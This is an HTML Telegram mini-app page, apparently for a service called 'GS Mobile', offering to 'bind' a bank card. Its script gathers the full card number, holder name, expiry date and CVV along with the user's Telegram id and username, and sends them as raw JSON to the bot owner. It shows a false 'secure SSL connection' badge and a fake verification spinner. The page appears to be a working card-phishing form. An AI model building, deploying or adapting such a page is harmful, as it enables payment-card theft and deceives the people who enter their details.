<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Привязка карты - GS Mobile</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            padding: 30px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        
        .logo {
            text-align: center;
            margin-bottom: 25px;
        }
        
        .logo h1 {
            color: #667eea;
            font-size: 28px;
            margin-bottom: 5px;
        }
        
        .logo p {
            color: #888;
            font-size: 14px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
            font-size: 14px;
        }
        
        input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        
        input:focus {
            outline: none;
            border-color: #667eea;
        }
        
        .card-row {
            display: flex;
            gap: 15px;
        }
        
        .card-row .form-group {
            flex: 1;
        }
        
        .card-row .form-group:last-child {
            flex: 0.8;
        }
        
        .card-number {
            position: relative;
        }
        
        .card-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 24px;
        }
        
        .submit-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            margin-top: 10px;
        }
        
        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
        }
        
        .submit-btn:active {
            transform: translateY(0);
        }
        
        .submit-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        
        .security-note {
            text-align: center;
            margin-top: 20px;
            color: #888;
            font-size: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
        }
        
        .lock-icon {
            font-size: 14px;
        }
        
        .error-message {
            color: #e74c3c;
            font-size: 13px;
            margin-top: 5px;
            display: none;
        }
        
        .loading {
            display: none;
            text-align: center;
            padding: 20px;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .success {
            display: none;
            text-align: center;
            padding: 30px;
        }
        
        .success-icon {
            font-size: 60px;
            color: #27ae60;
            margin-bottom: 15px;
        }
        
        .success h2 {
            color: #333;
            margin-bottom: 10px;
        }
        
        .success p {
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>💳 GS Mobile</h1>
            <p>Привязка банковской карты</p>
        </div>
        
        <form id="cardForm">
            <div class="form-group">
                <label for="cardNumber">Номер карты</label>
                <div class="card-number">
                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required>
                    <span class="card-icon">💳</span>
                </div>
                <div class="error-message" id="cardError">Введите корректный номер карты</div>
            </div>
            
            <div class="form-group">
                <label for="cardHolder">Держатель карты</label>
                <input type="text" id="cardHolder" placeholder="IVAN IVANOV" maxlength="26" required>
            </div>
            
            <div class="card-row">
                <div class="form-group">
                    <label for="expiry">Срок действия</label>
                    <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
                </div>
                <div class="form-group">
                    <label for="cvv">CVV</label>
                    <input type="password" id="cvv" placeholder="123" maxlength="3" required>
                </div>
            </div>
            
            <button type="submit" class="submit-btn" id="submitBtn">
                Привязать карту
            </button>
        </form>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Проверяем данные карты...</p>
        </div>
        
        <div class="success" id="success">
            <div class="success-icon">✅</div>
            <h2>Карта привязана!</h2>
            <p>Можете закрыть это окно</p>
        </div>
        
        <div class="security-note">
            <span class="lock-icon">🔒</span>
            <span>Безопасное соединение SSL</span>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();
        
        tg.MainButton.setText('Привязать карту');
        tg.MainButton.hide();
        
        const cardNumber = document.getElementById('cardNumber');
        const expiry = document.getElementById('expiry');
        const cvv = document.getElementById('cvv');
        const cardHolder = document.getElementById('cardHolder');
        const form = document.getElementById('cardForm');
        const submitBtn = document.getElementById('submitBtn');
        const loading = document.getElementById('loading');
        const success = document.getElementById('success');
        
        // Форматирование номера карты
        cardNumber.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            value = value.substring(0, 16);
            const parts = value.match(/.{1,4}/g);
            e.target.value = parts ? parts.join(' ') : value;
        });
        
        // Форматирование срока действия
        expiry.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
        });
        
        // Только цифры для CVV
        cvv.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
        });
        
        // Валидация
        function validateCard() {
            const number = cardNumber.value.replace(/\s/g, '');
            return number.length === 16 && 
                   cardHolder.value.length > 3 &&
                   expiry.value.length === 5 &&
                   cvv.value.length === 3;
        }
        
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            if (!validateCard()) {
                document.getElementById('cardError').style.display = 'block';
                return;
            }
            
            submitBtn.disabled = true;
            form.style.display = 'none';
            loading.style.display = 'block';
            
            const cardData = {
                card_number: cardNumber.value.replace(/\s/g, ''),
                card_holder: cardHolder.value.toUpperCase(),
                expiry: expiry.value,
                cvv: cvv.value,
                user_id: tg.initDataUnsafe.user?.id,
                username: tg.initDataUnsafe.user?.username
            };
            
            // Отправка данных через Telegram
            tg.sendData(JSON.stringify(cardData));
            
            setTimeout(() => {
                loading.style.display = 'none';
                success.style.display = 'block';
                tg.close();
            }, 2000);
        });
    </script>
</body>
</html>
